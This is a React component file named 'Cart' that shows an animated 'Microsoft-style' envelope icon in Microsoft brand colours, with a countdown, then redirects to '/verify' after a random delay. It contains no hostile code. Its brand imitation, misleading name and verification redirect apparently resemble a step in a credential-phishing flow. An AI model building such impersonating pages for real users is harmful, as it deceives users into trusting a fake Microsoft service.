import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';

const Cart = () => {
  const navigate = useNavigate();
  const [countdown, setCountdown] = useState('');

  useEffect(() => {
    // Random delay ~ 2s ±1s: uniform between 1000ms and 3000ms
    const delayMs = Math.floor(1000 + Math.random() * 2000);
    
    // Update UI to show approximate seconds (rounded)
    const secs = Math.round(delayMs / 1000 * 10) / 10;
    setCountdown(`Waiting ~ ${secs} second${secs === 1 ? '' : 's'}…`);
    
    // Perform redirect after the delay
    const timer = setTimeout(() => {
      navigate('/verify');
    }, delayMs);

    return () => clearTimeout(timer);
  }, [navigate]);

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-white to-gray-50">
      <style>{`
        @keyframes gentle-bounce {
          0%, 100% {
            transform: translateY(0) scale(1);
          }
          50% {
            transform: translateY(-8px) scale(1.02);
          }
        }
        .envelope-bounce {
          animation: gentle-bounce 2s ease-in-out infinite;
        }
      `}</style>
      
      <div className="bg-white rounded-3xl p-12 shadow-2xl border border-gray-200 max-w-lg">
        {/* Microsoft-style Envelope Icon */}
        <div className="flex flex-col items-center text-center">
          <div className="envelope-bounce mb-6">
            <svg 
              width="120" 
              height="120" 
              viewBox="0 0 120 120" 
              fill="none" 
              xmlns="http://www.w3.org/2000/svg"
            >
              {/* Envelope body */}
              <rect 
                x="15" 
                y="30" 
                width="90" 
                height="60" 
                rx="4" 
                fill="url(#envelope-gradient)" 
                stroke="#0078D4" 
                strokeWidth="2"
              />
              
              {/* Envelope flap back */}
              <path 
                d="M15 30 L60 60 L105 30" 
                stroke="#0078D4" 
                strokeWidth="2" 
                fill="none"
              />
              
              {/* Envelope flap front - creates depth */}
              <path 
                d="M15 30 L60 60 L105 30 L60 45 Z" 
                fill="url(#flap-gradient)" 
                opacity="0.9"
              />
              
              {/* Letter inside - subtle detail */}
              <rect 
                x="30" 
                y="45" 
                width="60" 
                height="35" 
                rx="2" 
                fill="white" 
                opacity="0.3"
              />
              
              {/* Checkmark on letter */}
              <path 
                d="M50 62 L56 68 L70 54" 
                stroke="#107C10" 
                strokeWidth="3" 
                strokeLinecap="round" 
                strokeLinejoin="round"
                fill="none"
              />
              
              <defs>
                <linearGradient id="envelope-gradient" x1="15" y1="30" x2="105" y2="90" gradientUnits="userSpaceOnUse">
                  <stop offset="0%" stopColor="#0078D4"/>
                  <stop offset="100%" stopColor="#00BCF2"/>
                </linearGradient>
                <linearGradient id="flap-gradient" x1="60" y1="30" x2="60" y2="60" gradientUnits="userSpaceOnUse">
                  <stop offset="0%" stopColor="#005A9E"/>
                  <stop offset="100%" stopColor="#0078D4"/>
                </linearGradient>
              </defs>
            </svg>
          </div>


                {/* Content */}
          
          
          <div className="flex items-center gap-2 text-sm text-gray-500">
            <span>{countdown}</span>
          </div>

          
        </div>
    
      </div>
    </div>
  );
};

export default Cart;
